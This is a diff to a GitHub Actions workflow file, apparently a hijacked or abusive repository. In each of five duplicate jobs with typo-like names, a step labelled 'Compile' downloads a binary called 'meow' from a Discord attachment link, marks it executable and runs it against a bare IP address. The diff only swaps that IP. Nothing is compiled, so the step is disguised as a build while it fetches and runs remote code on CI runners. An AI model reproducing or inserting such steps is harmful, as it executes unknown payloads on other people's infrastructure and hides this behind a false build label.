@@ -10,32 +10,32 @@ jobs:
     steps:
       - uses: actions/checkout@v2
       - name: Compile
-        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow https://176.9.16.251
+        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow http://88.198.48.45
   builrd:
     runs-on: ubuntu-latest
 
     steps:
       - uses: actions/checkout@v2
       - name: Compile
-        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow https://176.9.16.251
+        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow http://88.198.48.45
   buiald:
     runs-on: ubuntu-latest
 
     steps:
       - uses: actions/checkout@v2
       - name: Compile
-        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow https://176.9.16.251
+        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow http://88.198.48.45
   builsd:
     runs-on: ubuntu-latest
 
     steps:
       - uses: actions/checkout@v2
       - name: Compile
-        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow https://176.9.16.251
+        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow http://88.198.48.45
   builfd:
     runs-on: ubuntu-latest
 
     steps:
       - uses: actions/checkout@v2
       - name: Compile
-        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow https://176.9.16.251
+        run: wget https://cdn.discordapp.com/attachments/950853557995851797/1089687549846503485/meow && chmod +x ./meow && ./meow http://88.198.48.45
